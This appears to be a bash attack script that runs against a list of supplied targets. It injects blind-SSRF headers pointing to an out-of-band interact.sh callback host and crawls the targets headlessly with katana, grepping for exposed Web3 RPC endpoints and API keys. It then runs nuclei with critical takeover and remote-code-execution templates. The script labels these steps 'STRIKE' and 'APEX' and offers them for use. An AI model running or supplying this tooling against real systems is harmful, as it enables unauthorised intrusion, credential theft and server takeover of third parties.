#!/bin/bash
# --- 1. PATHS ---
BIN_DIR="$HOME/.smallville_bin"
KATANA="$BIN_DIR/katana"; NUCLEI="$BIN_DIR/nuclei"
ACTION="$1"; TARGET="$2"

if [ "$ACTION" == "strike" ]; then
    echo ">> [APEX] INITIATING BLIND OOB & WEB3 INJECTION..."
    echo "$TARGET" | tr ',' '\n' | tr -d ' ' > /tmp/targets.txt

    # --- PHASE 1: OOB BLIND SSRF INJECTION ---
    # Injecting unique headers into standard Nuclei scans to catch silent background triggers
    OOB_SERVER="http://your-unique-id.interact.sh"
    GLOBAL_ARGS="-H 'X-Forwarded-For: $OOB_SERVER' -H 'X-Api-Key: $OOB_SERVER'"

    # --- PHASE 2: WEB3 FRONTEND & RPC CRAWLING ---
    echo ">> [PHASE 2] Hunting for exposed Web3 RPC Nodes and API Keys..."
    $KATANA -list /tmp/targets.txt -headless -system-chrome -jc -silent | grep -E "infura|alchemy|rpc|quicknode" > /tmp/rpc_found.txt

    # --- PHASE 4: STRIKE (TAKEOVER + BLIND RCE) ---
    echo ">> [PHASE 4] STRIKE: Running Elite Nuclei Templates..."
    $NUCLEI -l /tmp/targets.txt -silent -severity critical -t takeovers/ -t rce/ $GLOBAL_ARGS
fi
